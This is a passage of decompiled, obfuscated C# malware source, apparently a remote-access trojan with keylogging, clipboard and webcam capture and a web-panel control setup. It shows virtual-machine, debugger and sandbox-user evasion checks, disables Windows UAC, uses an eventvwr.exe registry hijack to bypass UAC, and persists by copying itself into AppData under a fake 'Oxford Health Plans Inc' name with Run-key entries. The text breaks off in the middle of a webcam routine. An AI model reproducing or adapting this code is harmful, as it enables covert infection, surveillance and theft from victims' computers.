						enumerator = ((IEnumerable)objectValue).GetEnumerator();
						while (enumerator.MoveNext())
						{
							ManagementBaseObject managementBaseObject = (ManagementBaseObject)enumerator.Current;
							string text = managementBaseObject["Manufacturer"].ToString().ToLower();
							Console.WriteLine(RuntimeHelpers.GetObjectValue(managementBaseObject["Model"]));
							if ((Operators.CompareString(text, "microsoft corporation", false) == 0 && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || Operators.CompareString(managementBaseObject["Model"].ToString(), "VirtualBox", false) == 0 || Operators.CompareString(managementBaseObject["Model"].ToString().ToLower(), "vbox", false) == 0)
							{
								return true;
							}
						}
					}
					finally
					{
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				finally
				{
					if (objectValue != null)
					{
						((IDisposable)objectValue).Dispose();
					}
				}
			}
			finally
			{
				if (obj != null)
				{
					((IDisposable)obj).Dispose();
				}
			}
			string[] array2 = array;
			foreach (string qA_ in array2)
			{
				if (BBF(qA_).ToInt32() != 0)
				{
					return true;
				}
			}
			return false;
		}

		private bool CF()
		{
			bool SB_ = false;
			if (OG(Process.GetCurrentProcess().Handle, ref SB_))
			{
				return SB_;
			}
			if (Debugger.IsAttached)
			{
				SB_ = true;
			}
			else if (CW() == -1)
			{
				SB_ = true;
			}
			return SB_;
		}

		private bool NQG()
		{
			int num = 0;
			IntPtr handle = Process.GetCurrentProcess().Handle;
			IntPtr EE_ = (IntPtr)num;
			IntPtr zN_ = default(IntPtr);
			int num2 = EZM(handle, 7, ref EE_, Marshal.SizeOf(num), zN_);
			num = (int)EE_;
			int num3 = num2;
			if (num3 == 0 && num != 0)
			{
				return true;
			}
			return false;
		}

		private bool LM()
		{
			int num = 0;
			IntPtr handle = Process.GetCurrentProcess().Handle;
			IntPtr EE_ = (IntPtr)num;
			IntPtr zN_ = default(IntPtr);
			int num2 = EZM(handle, 30, ref EE_, Marshal.SizeOf(num), zN_);
			num = (int)EE_;
			int num3 = num2;
			if (num3 == 0 && num != 0)
			{
				return true;
			}
			return false;
		}

		private bool K()
		{
			int num = 0;
			IntPtr handle = Process.GetCurrentProcess().Handle;
			IntPtr EE_ = (IntPtr)num;
			IntPtr zN_ = default(IntPtr);
			int num2 = EZM(handle, 31, ref EE_, Marshal.SizeOf(num), zN_);
			num = (int)EE_;
			int num3 = num2;
			if (num3 == 0 && num == 0)
			{
				return true;
			}
			return false;
		}

		private bool HT()
		{
			IntPtr wI_ = default(IntPtr);
			if (_XL(JB(), 17, wI_, 0) != 0)
			{
				return true;
			}
			return false;
		}

		private bool GS()
		{
			bool result = false;
			try
			{
				IntPtr pZ_ = new IntPtr(-1717986919);
				BB(pZ_);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				result = true;
				ProjectData.ClearProjectError();
			}
			try
			{
				IntPtr pZ_ = new IntPtr(-1717986919);
				UI(pZ_);
				return result;
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception ex4 = ex3;
				result = true;
				ProjectData.ClearProjectError();
				return result;
			}
		}

		private bool SM()
		{
			CONTEXT cONTEXT = default(CONTEXT);
			cONTEXT.ContextFlags = 65552u;
			Marshal.AllocHGlobal(Marshal.SizeOf(cONTEXT));
			if (((ulong)cONTEXT.Dr0 != 0) | ((ulong)cONTEXT.Dr1 != 0) | ((ulong)cONTEXT.Dr2 != 0) | ((ulong)cONTEXT.Dr3 != 0))
			{
				return true;
			}
			return false;
		}

		private object EGU()
		{
			SYSTEM_INFO sYSTEM_INFO = default(SYSTEM_INFO);
			int num = checked((int)CS(0u, sYSTEM_INFO.PageSize, 3000u, 40u));
			if (num == 0)
			{
				return false;
			}
			SO(num, 1L, 195);
			uint ZRR_ = default(uint);
			if (0 - (IK(Process.GetCurrentProcess().Handle, (IntPtr)num, (IntPtr)sYSTEM_INFO.PageSize, 320u, ref ZRR_) ? 1 : 0) == 0)
			{
				return false;
			}
			try
			{
				HK((IntPtr)num, (IntPtr)0, (IntPtr)0, 0, 0);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				object result = false;
				ProjectData.ClearProjectError();
				return result;
			}
			return true;
		}

		private bool HI()
		{
			int num = 0;
			int num2 = 0;
			checked
			{
				do
				{
					Thread.Sleep(15);
					if (OB() != 1073741860)
					{
						num++;
					}
					num2++;
				}
				while (num2 <= 20);
				if (num <= 3)
				{
					return false;
				}
				return true;
			}
		}

		private bool L_()
		{
			int id = IW().Id;
			int VP_ = 0;
			int num = YM((IntPtr)TWB(), ref VP_);
			//if (VP_ != VP_)
			//{
			//	return true;
			//}
			return false;
		}

		private Process IW()
		{
			int num = 0;
			int id = Process.GetCurrentProcess().Id;
			IntPtr intPtr = NZ(MY_35, 0u);
			if (intPtr == IntPtr.Zero)
			{
				return null;
			}
			PROCESSENTRY32 CWZ_ = default(PROCESSENTRY32);
			checked
			{
				CWZ_.dwSize = (uint)Marshal.SizeOf(typeof(PROCESSENTRY32));
				if (!_YM(intPtr, ref CWZ_))
				{
					return null;
				}
				do
				{
					if (id == CWZ_.th32ProcessID)
					{
						num = (int)CWZ_.th32ParentProcessID;
					}
				}
				while (num == 0 && CPG(intPtr, ref CWZ_));
				if (num > 0)
				{
					return Process.GetProcessById(num);
				}
				return null;
			}
		}

		private bool QJU()
		{
			IntPtr intPtr = HTV(1000, false, checked((uint)MH()));
			if (intPtr != IntPtr.Zero)
			{
				UI(intPtr);
				return true;
			}
			return false;
		}

		private bool UR()
		{
			IntPtr wX_ = default(IntPtr);
			IntPtr intPtr = DM(wX_, false, Guid.NewGuid().ToString().Replace("-", ""));
			ZL(intPtr, HANDLE_FLAGS.PROTECT_FROM_CLOSE, HANDLE_FLAGS.PROTECT_FROM_CLOSE);
			try
			{
				UI(intPtr);
				return false;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				bool result = true;
				ProjectData.ClearProjectError();
				return result;
			}
		}

		private bool GN()
		{
			IntPtr intPtr = new IntPtr(checked(((IntPtr)2147352576).ToInt32() + 724));
			bool flag = (intPtr.ToInt32() & 1) == 1;
			bool flag2 = (intPtr.ToInt32() & 2) == 0;
			if (flag || !flag2)
			{
				return true;
			}
			return false;
		}

		[DllImport("kernel32.dll", EntryPoint = "VirtualProtect")]
		private static extern IntPtr Z_(IntPtr GQP_41, IntPtr WF_42, IntPtr M__43, ref IntPtr KVZ_44);

		[DllImport("kernel32", EntryPoint = "VirtualFree")]
		private static extern bool E_(IntPtr BJ_45, uint ZX_46, FreeType D__47);

		[DllImport("kernel32.dll", EntryPoint = "ZeroMemory")]
		private static extern IntPtr RI(IntPtr AZ_48, IntPtr QT_49);

		[DllImport("Kernel32.dll", CharSet = CharSet.Auto, EntryPoint = "CreateMutex", SetLastError = true)]
		private static extern IntPtr DM(IntPtr WX_50, bool RRL_51, string QU_52);

		[DllImport("kernel32.dll", EntryPoint = "SetHandleInformation", SetLastError = true)]
		private static extern bool ZL(IntPtr OS_53, HANDLE_FLAGS FS_54, HANDLE_FLAGS OV_55);

		[DllImport("kernel32.dll", CharSet = CharSet.Auto, EntryPoint = "GetModuleHandle", SetLastError = true)]
		private static extern IntPtr BBF(string QA_56);

		[DllImport("kernel32.dll", EntryPoint = "CheckRemoteDebuggerPresent", ExactSpelling = true, SetLastError = true)]
		private static extern bool OG(IntPtr CEN_57, ref bool SB_58);

		[DllImport("kernel32.dll", EntryPoint = "GetCurrentThread")]
		private static extern IntPtr JB();

		[DllImport("ntdll.dll", EntryPoint = "NtClose", ExactSpelling = true)]
		private static extern int BB(IntPtr PZ_59);

		[DllImport("kernel32.dll", EntryPoint = "CloseHandle", SetLastError = true)]
		private static extern bool UI(IntPtr EC_60);

		[DllImport("kernel32.dll", EntryPoint = "GetThreadContext")]
		[SuppressUnmanagedCodeSecurity]
		private static extern bool PP(IntPtr I__61, ref CONTEXT ML_62);

		[DllImport("kernel32.dll", EntryPoint = "GetSystemInfo")]
		private static extern void VR(ref SYSTEM_INFO FRX_63);

		[DllImport("kernel32", EntryPoint = "VirtualAlloc")]
		private static extern uint CS(uint EGA_64, uint VV_65, uint KU_66, uint GQ_67);

		[DllImport("kernel32", CharSet = CharSet.Auto, EntryPoint = "VirtualProtectEx", SetLastError = true)]
		private static extern bool IK(IntPtr VX_68, IntPtr IG_69, IntPtr YOC_70, uint LZA_71, ref uint ZRR_72);

		[DllImport("user32.dll", EntryPoint = "CallWindowProc")]
		private static extern int HK(IntPtr FK_73, IntPtr II_74, IntPtr RH_75, int GF_76, int UC_77);

		[DllImport("kernel32.dll", EntryPoint = "ReadProcessMemory", SetLastError = true)]
		private static extern bool FH(IntPtr MA_78, IntPtr HH_79, ref int JH_80, int DE_81, ref int AB_82);

		[DllImport("kernel32.dll", EntryPoint = "CreateToolhelp32Snapshot", SetLastError = true)]
		private static extern IntPtr NZ(uint NF_83, uint VQT_84);

		[DllImport("kernel32.dll", EntryPoint = "Process32First")]
		private static extern bool _YM(IntPtr ZW_85, ref PROCESSENTRY32 CWZ_86);

		[DllImport("kernel32.dll", EntryPoint = "Process32Next")]
		private static extern bool CPG(IntPtr YH_87, ref PROCESSENTRY32 MS_88);

		[DllImport("user32.dll", EntryPoint = "GetWindowThreadProcessId", SetLastError = true)]
		private static extern int YM(IntPtr XR_89, ref int VP_90);

		[DllImport("user32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetShellWindow", ExactSpelling = true, SetLastError = true)]
		private static extern int TWB();

		[DllImport("ntdll.dll", CharSet = CharSet.Ansi, EntryPoint = "CsrGetProcessId", ExactSpelling = true, SetLastError = true)]
		private static extern int MH();

		[DllImport("kernel32", CharSet = CharSet.Ansi, EntryPoint = "OpenProcess", ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr HTV(int MRW_91, bool WL_92, uint JAJ_93);

		[DllImport("ntdll.dll", CharSet = CharSet.Ansi, EntryPoint = "NtYieldExecution", ExactSpelling = true, SetLastError = true)]
		private static extern int OB();

		[DllImport("kernel32", CharSet = CharSet.Ansi, EntryPoint = "IsDebuggerPresent", ExactSpelling = true, SetLastError = true)]
		private static extern int CW();

		[DllImport("ntdll.dll", CharSet = CharSet.Ansi, EntryPoint = "NtQueryInformationProcess", ExactSpelling = true, SetLastError = true)]
		private static extern int EZM(IntPtr DZ_94, int VE_95, ref IntPtr EE_96, int CD_97, IntPtr ZN_98);

		[DllImport("ntdll.dll", CharSet = CharSet.Ansi, EntryPoint = "ZwSetInformationThread", ExactSpelling = true, SetLastError = true)]
		private static extern int _XL(IntPtr T__99, int XQ_100, IntPtr WI_101, int KAT_102);

		[DllImport("kernel32", CharSet = CharSet.Ansi, EntryPoint = "RtlFillMemory", ExactSpelling = true, SetLastError = true)]
		private static extern void SO(object SX_103, long TL_104, byte JOL_105);

		private void ABK()
		{
			IntPtr intPtr = BBF(null);
			IntPtr KVZ_ = default(IntPtr);
			Z_(intPtr, (IntPtr)4096, (IntPtr)64, ref KVZ_);
			RI(intPtr, (IntPtr)4096);
			E_(intPtr, 0u, FreeType.RELEASE);
		}
	}

	private static C VY_36 = default(C);

	private static bool _KJ_37 = true;

	private static string HDM_38 = "";

	private static bool GD_39 = true;

	private static bool VH_40 = true;

	private static bool UCP_41 = false;

	private static string FO_42 = "30";

	private static string _AL_43 = "30";

	private static string OTI_44 = "30";

	private static bool YWD_45 = true;

	private static string WEL_46 = "webpanel";

	private static bool QME_47 = false;

	private static bool VHE_48 = false;

	private static bool HC_49 = false;

	private static bool YX_50 = false;

	private static bool MB_51 = false;

	private static bool SXG_52 = false;

	private static bool RVD_53 = false;

	private static bool BVY_54 = false;

	private static bool UE_55 = false;

	private static bool MCO_56 = false;

	private static bool BET_57 = false;

	private static bool UYQ_58 = false;

	private static bool OEM_59 = false;

	private static string MW_60 = Environment.GetEnvironmentVariable("appdata") + "\\Oxford Health Plans Inc\\Oxford Health Plans Inc.exe";

	private static bool _D_61 = true;

	private static bool KS_62 = false;

	private static bool VT_63 = false;

	private static bool GU_64 = false;

	private static string LK_65 = "";

	private static bool QR_66 = true;

	private static bool _X_67 = false;

	private static string HX_68 = LWB.RNU();

	private static string NQW_69 = "yyyy-MM-dd HH:mm:ss";

	private static string LR_70 = SystemInformation.UserName + "/" + SystemInformation.ComputerName;

	private static string GO_71 = QE();

	private static string BU_72 = "gc3LhQzaDdTYt2jH3fqLIQ==";

	private static string MU_73 = "";

	private static Random SS_74;

	private static RegistryKey GY_75;

	private static object WPM_76;

	private static string PS_77;

	private static Mutex HKE_78;

	public const int _V_79 = 1024;

	public const int WLO_80 = 1034;

	public const int CXP_81 = 1035;

	public const int LC_82 = 1084;

	public const int HFX_83 = 1054;

	public const int WIJ_84 = 1073741824;

	public const int TB_85 = 268435456;

	public const int MT_86 = 1024;

	public const int TLC_87 = 1077;

	public const int ZXT_88 = 1076;

	public const int AH_89 = 1074;

	public static int CQU_90;

	[AccessedThroughProperty("Sendwebcam")]
	private static System.Windows.Forms.Timer OAD_91;

	private static string ES_92;

	[AccessedThroughProperty("MH")]
	private static PB NL_93;

	[AccessedThroughProperty("CH")]
	private static Clipboard JR_94;

	[AccessedThroughProperty("kbHook")]
	private static PC UU_95;

	private static string TGW_96;

	private static string BU__97;

	private static string NW_98;

	private static bool YW_99;

	private static string[] FL_100;

	private static bool XW_101;

	internal static System.Windows.Forms.Timer HFS_102
	{
		get
		{
			//Discarded unreachable code: IL_0006, IL_0019
			//IL_0010: Expected O, but got I4
			return OAD_91;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			//Discarded unreachable code: IL_0041, IL_0054
			//IL_004b: Expected O, but got I4
			if (OAD_91 != null)
			{
				OAD_91.Tick -= IL;
			}
			OAD_91 = value;
			if (OAD_91 != null)
			{
				OAD_91.Tick += IL;
			}
		}
	}

	private static PB LDK_103
	{
		get
		{
			//Discarded unreachable code: IL_0006, IL_0019
			//IL_0010: Expected O, but got I4
			return NL_93;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			//Discarded unreachable code: IL_006d, IL_0080
			//IL_0077: Expected O, but got I4
			if (NL_93 != null)
			{
				NL_93.LZ_22 -= JT;
				NL_93.RE_19 -= FN;
			}
			NL_93 = value;
			if (NL_93 != null)
			{
				NL_93.LZ_22 += JT;
				NL_93.RE_19 += FN;
			}
		}
	}

	private static Clipboard LPH_104
	{
		get
		{
			//Discarded unreachable code: IL_0006, IL_0019
			//IL_0010: Expected O, but got I4
			return JR_94;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			//Discarded unreachable code: IL_0041, IL_0054
			//IL_004b: Expected O, but got I4
			if (JR_94 != null)
			{
				JR_94.Changed -= AGM;
			}
			JR_94 = value;
			if (JR_94 != null)
			{
				JR_94.Changed += AGM;
			}
		}
	}

	private static PC CK_105
	{
		get
		{
			//Discarded unreachable code: IL_0006, IL_0019
			//IL_0010: Expected O, but got I4
			return UU_95;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			//Discarded unreachable code: IL_0037, IL_004a
			//IL_0041: Expected O, but got I4
			if (UU_95 != null)
			{
				PC.KA_33 -= TD;
			}
			UU_95 = value;
			if (UU_95 != null)
			{
				PC.KA_33 += TD;
			}
		}
	}

	static N()
	{
		//Discarded unreachable code: IL_01e4, IL_01f7
		//IL_01ee: Expected O, but got I4
		checked
		{
			SS_74 = new Random((int)unchecked(DateTime.Now.Ticks % int.MaxValue));
			GY_75 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", false);
			WPM_76 = RuntimeHelpers.GetObjectValue(GY_75.GetValue("ProductId"));
			PS_77 = "76487-337-8429955-22614";
			CQU_90 = 0;
			ES_92 = "";
			LDK_103 = new PB();
			LPH_104 = new Clipboard();
			CK_105 = new PC();
			TGW_96 = null;
			BU__97 = null;
			NW_98 = null;
			YW_99 = false;
			FL_100 = new string[0];
		}
	}

	[DllImport("user32.dll", EntryPoint = "GetLastInputInfo")]
	public static extern bool SJ(ref C HV_106);

	private static void IY(string ZCE_107)
	{
		int num = Conversions.ToInteger(W.F_4.Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", "1"));
		if (num == 0 || !File.Exists(ZCE_107))
		{
			return;
		}
		try
		{
			string pathRoot = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));
			string path = @"Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
			string arg = Path.Combine(pathRoot, path);
			string value = string.Format("{0} Start-Process -FilePath {1} -wait", arg, ZCE_107);
			using (RegistryKey registryKey = Registry.CurrentUser)
			{
				using (RegistryKey registryKey2 = registryKey.CreateSubKey(@"SOFTWARE\Classes\mscfile\shell\open\command"))
				{
					registryKey2.SetValue("", value, RegistryValueKind.String);
				}
			}
			Process.Start("eventvwr.exe");
			Thread.Sleep(5000);
			Registry.CurrentUser.DeleteSubKeyTree(@"SOFTWARE\Classes\mscfile");
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	public static bool UA(int SG_108, int XBD_109)
	{
		//Discarded unreachable code: IL_0019, IL_002c
		//IL_0023: Expected O, but got I4
		while (SG_108 >= XBD_109)
		{
			SG_108 = checked(SG_108 - 1);
			Thread.Sleep(1000);
		}
		return false;
	}

	[STAThread]
	public static void Main() // Changed from KZ
	{
		//Discarded unreachable code: IL_06ba, IL_06cd
		//IL_06c4: Expected O, but got I4
		//IL_06c5: Expected O, but got I4
		if (UA(15, 1))
		{
			Application.Exit();
		}
		if (Operators.ConditionalCompareObjectEqual(RJA(), true, false))
		{
			Application.Exit();
		}
		ZI();
		if (QR_66)
		{
			string oSFullName = W.F_4.Info.OSFullName;
			if (oSFullName.Contains("Windows 7") | oSFullName.Contains("Windows 8") | oSFullName.Contains("Windows 10"))
			{
				int num = Conversions.ToInteger(W.F_4.Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", "1"));
				if (num == 1)
				{
					try
					{
						W.F_4.Registry.SetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", "0");
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						IY(Assembly.GetExecutingAssembly().Location);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
		{
			ZM();
			HD_();
		}
		LK_65 = Assembly.GetExecutingAssembly().Location;
		if (Operators.CompareString(LK_65, MW_60, false) != 0 && _D_61)
		{
			if (!Directory.Exists(Environment.GetEnvironmentVariable("appdata") + @"\Oxford Health Plans Inc\"))
			{
				Directory.CreateDirectory(Environment.GetEnvironmentVariable("appdata") + @"\Oxford Health Plans Inc\");
			}
			try
			{
				if (File.Exists(MW_60))
				{
					try
					{
						string fullPath = Path.GetFullPath(MW_60);
						Process[] processes = Process.GetProcesses();
						foreach (Process process in processes)
						{
							string fullPath2 = Path.GetFullPath(process.MainModule.FileName);
							if (Operators.CompareString(fullPath2, fullPath, false) == 0)
							{
								process.Kill();
							}
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				if (File.Exists(LK_65))
				{
					if (File.Exists(MW_60))
					{
						try
						{
							File.Delete(MW_60);
						}
						catch (Exception ex)
						{
							ProjectData.SetProjectError(ex);
							Exception ex2 = ex;
							ProjectData.ClearProjectError();
						}
					}
					File.Copy(LK_65, MW_60, true);
					if (KS_62)
					{
						File.SetAttributes(MW_60, FileAttributes.Hidden | FileAttributes.System);
					}
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
				registryKey.SetValue("Oxford Health Plans Inc", MW_60);
				RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run", true);
				if (registryKey2 != null)
				{
					byte[] value = new byte[12]
					{
						2,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0,
						0
					};
					registryKey2.SetValue("Oxford Health Plans Inc", value);
					registryKey2.Close();
				}
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
		}
		JV(MW_60);
		if (GU_64 && Operators.CompareString(LK_65, MW_60, false) != 0)
		{
			_Q();
		}
		if (VT_63)
		{
			Interaction.Shell("Shutdown -r -t 5");
		}
		if (QME_47)
		{
			Thread thread = new Thread(JL);
			thread.IsBackground = true;
			thread.Start();
		}
		if (VHE_48)
		{
			Thread thread2 = new Thread(XHL);
			thread2.IsBackground = true;
			thread2.Start();
		}
		Thread thread3 = new Thread(XWB);
		thread3.IsBackground = true;
		thread3.Start();
		if (OEM_59)
		{
			Thread thread4 = new Thread(XEN);
			thread4.IsBackground = true;
			thread4.Start();
		}
		checked
		{
			if (GD_39)
			{
				System.Timers.Timer timer = new System.Timers.Timer();
				timer.Elapsed += _L;
				timer.Interval = 60000 * Conversions.ToInteger(FO_42);
				timer.Enabled = true;
				timer.Start();
			}
			Thread thread5 = new Thread(JX);
			thread5.IsBackground = true;
			thread5.Start();
			if (VH_40 == Conversions.ToBoolean("True"))
			{
				System.Timers.Timer timer2 = new System.Timers.Timer();
				timer2.Elapsed += XT;
				timer2.Interval = 60000 * Conversions.ToInteger(_AL_43);
				timer2.Enabled = true;
			}
			if (UCP_41 == Conversions.ToBoolean("True"))
			{
				HFS_102 = new System.Windows.Forms.Timer();
				HFS_102.Interval = 60000 * Conversions.ToInteger(OTI_44);
				HFS_102.Enabled = true;
				HFS_102.Start();
			}
			if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
			{
				System.Timers.Timer timer3 = new System.Timers.Timer();
				timer3.Elapsed += JY;
				timer3.Interval = 60000.0;
				timer3.Enabled = true;
			}
			if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
			{
				ER();
			}
			if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
			{
				System.Timers.Timer timer4 = new System.Timers.Timer();
				timer4.Elapsed += YN;
				timer4.Interval = 300000.0;
				timer4.Enabled = true;
			}
			try
			{
				Thread thread6 = new Thread(EH);
				thread6.SetApartmentState(ApartmentState.STA);
				thread6.Start();
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
			OZ oZ = new OZ();
			if (HC_49)
			{
				try
				{
					ResourceManager resourceManager = new ResourceManager("Player", Assembly.GetExecutingAssembly());
					byte[] bytes = (byte[])resourceManager.GetObject("Player");
					MU_73 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Environment.GetEnvironmentVariable("temp") + @"\", LI(3)), ".exe"));
					File.WriteAllBytes(MU_73, bytes);
					Thread thread7 = new Thread(HL, 1);
					thread7.Start();
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3);
					Exception ex4 = ex3;
					ProjectData.ClearProjectError();
				}
			}
			Thread.Sleep(1000);
			LPH_104.Install();
			if (GD_39)
			{
				CK_105._E();
			}
			Application.Run();
		}
	}

	public static object RJA()
	{
		//Discarded unreachable code: IL_00c1, IL_00d4
		//IL_00cb: Expected O, but got I4
		//IL_00cc: Expected O, but got I4
		try
		{
			string text = SystemInformation.UserName + @"\" + SystemInformation.ComputerName;
			string[] array = new string[5]
			{
				"Johnson",
				"Miller",
				"michael",
				"Abby",
				"Emily"
			};
			bool flag = false;
			string[] array2 = array;
			foreach (string text2 in array2)
			{
				if (text.ToLower().Contains(text2.ToLower()))
				{
					flag = true;
				}
			}
			return flag;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			object result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void HL()
	{
		//Discarded unreachable code: IL_0070, IL_0083
		//IL_007a: Expected O, but got I4
		//IL_007b: Expected O, but got I4
		string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(MU_73);
		while (true)
		{
			try
			{
				object processesByName = Process.GetProcessesByName(fileNameWithoutExtension);
				if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(processesByName, null, "Length", new object[0], null, null, null), 0, false))
				{
					Process.Start(MU_73, Path.GetFullPath(Assembly.GetExecutingAssembly().Location));
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
			Thread.Sleep(800);
		}
	}

	public static object LI(int PF_110)
	{
		//Discarded unreachable code: IL_009b, IL_00ae
		//IL_00a5: Expected O, but got I4
		//IL_00a6: Expected O, but got I4
		string text = Conversions.ToString(Strings.Chr(SS_74.Next(65, 91)));
		checked
		{
			int num = PF_110 - 1;
			char value = default(char);
			for (int i = 1; i <= num; i++)
			{
				switch (SS_74.Next(1, 4))
				{
				case 1:
					value = Strings.Chr(SS_74.Next(65, 91));
					break;
				case 2:
					value = Strings.Chr(SS_74.Next(97, 123));
					break;
				case 3:
					value = Strings.Chr(SS_74.Next(48, 58));
					break;
				}
				text += Conversions.ToString(value);
			}
			return text;
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, EntryPoint = "GetVolumeInformationA", ExactSpelling = true, SetLastError = true)]
	private static extern int IB([MarshalAs(UnmanagedType.VBByRefStr)] ref string JMV_111, [MarshalAs(UnmanagedType.VBByRefStr)] ref string AAF_112, int YY_113, ref int LW_114, ref int IU_115, ref int BN_116, [MarshalAs(UnmanagedType.VBByRefStr)] ref string YGC_117, int SU_118);

	[DllImport("kernel32", CharSet = CharSet.Ansi, EntryPoint = "GetDiskFreeSpaceExA", ExactSpelling = true, SetLastError = true)]
	private static extern int Q_([MarshalAs(UnmanagedType.VBByRefStr)] ref string _B_119, ref long _H_120, ref long NH_121, ref long _O_122);

	public static string ID(M EA_123)
	{
		//Discarded unreachable code: IL_01f0, IL_0203
		//IL_01fa: Expected O, but got I4
		//IL_01fb: Expected O, but got I4
		try
		{
			ComputerInfo computerInfo = new ComputerInfo();
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(@"root\CIMV2", "SELECT * FROM Win32_VideoController");
			ManagementObjectSearcher managementObjectSearcher2 = new ManagementObjectSearcher("SELECT * FROM Win32_Processor");
			switch (EA_123)
			{
			case M.OperatingSystemName:
				return computerInfo.OSFullName;
			case M.ProcessorName:
			{
				string result2 = default(string);
				foreach (ManagementObject item in managementObjectSearcher2.Get())
				{
					result2 = item.GetPropertyValue("Name").ToString();
				}
				return result2;
			}
			case M.AmountOfMemory:
				return Conversions.ToString(Math.Round(Convert.ToDouble(Conversion.Val(computerInfo.TotalPhysicalMemory)) / 1024.0 / 1024.0, 2)) + " MB";
			case M.VideocardName:
			{
				string result3 = default(string);
				foreach (ManagementObject item2 in managementObjectSearcher.Get())
				{
					result3 = item2.GetPropertyValue("Name").ToString();
				}
				return result3;
			}
			case M.VideocardMem:
			{
				string inputStr = default(string);
				foreach (ManagementObject item3 in managementObjectSearcher.Get())
				{
					inputStr = item3.GetPropertyValue("AdapterRAM").ToString();
				}
				return Conversions.ToString(Math.Round(Convert.ToDouble(Conversion.Val(inputStr)) / 1024.0 / 1024.0, 2)) + " MB";
			}
			default:
			{
				string result = default(string);
				return result;
			}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result4 = "Unknown";
			ProjectData.ClearProjectError();
			return result4;
		}
	}

	public static string VJ(string UO_124, string TW_125)
	{
		//Discarded unreachable code: IL_0099, IL_00ac
		//IL_00a3: Expected O, but got I4
		//IL_00a4: Expected O, but got I4
		char[] array = UO_124.ToCharArray();
		char[] array2 = TW_125.ToCharArray();
		checked
		{
			char[] array3 = new char[UO_124.Length - 2 + 1];
			int num = array[UO_124.Length - 1];
			array[UO_124.Length - 1] = '\0';
			int num2 = 0;
			int num3 = UO_124.Length - 1;
			for (int i = 0; i <= num3; i++)
			{
				if (i < UO_124.Length - 1)
				{
					if (num2 >= array2.Length)
					{
						num2 = 0;
					}
					int num4 = array[i];
					int num5 = array2[num2];
					int value = num4 - num - num5;
					array3[i] = Convert.ToChar(value);
					num2++;
				}
			}
			return new string(array3);
		}
	}

	public static void ZI()
	{
		//Discarded unreachable code: IL_005a, IL_006d
		//IL_0064: Expected O, but got I4
		//IL_0065: Expected O, but got I4
		try
		{
			string processName = Process.GetCurrentProcess().ProcessName;
			int id = Process.GetCurrentProcess().Id;
			Process[] processesByName = Process.GetProcessesByName(processName);
			Process[] array = processesByName;
			foreach (Process process in array)
			{
				if (process.Id != id)
				{
					process.Kill();
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32", EntryPoint = "SendMessage")]
	public static extern int QI(int HM_126, uint NEP_127, int KY_128, int ZTO_129);

	[DllImport("avicap32.dll", EntryPoint = "capCreateCaptureWindowA")]
	public static extern int TV(string WG_130, int L_O_131, int UJ_132, int RQQ_133, int WQ_134, int QK_135, int YAF_136, int UX_137);

	private static void IL(object HR_138, EventArgs BF_139)
	{
		//Discarded unreachable code: IL_047e, IL_0491
		//IL_0488: Expected O, but got I4
		//IL_0489: Expected O, but got I4
		try
		{
			PictureBox pictureBox = new PictureBox();
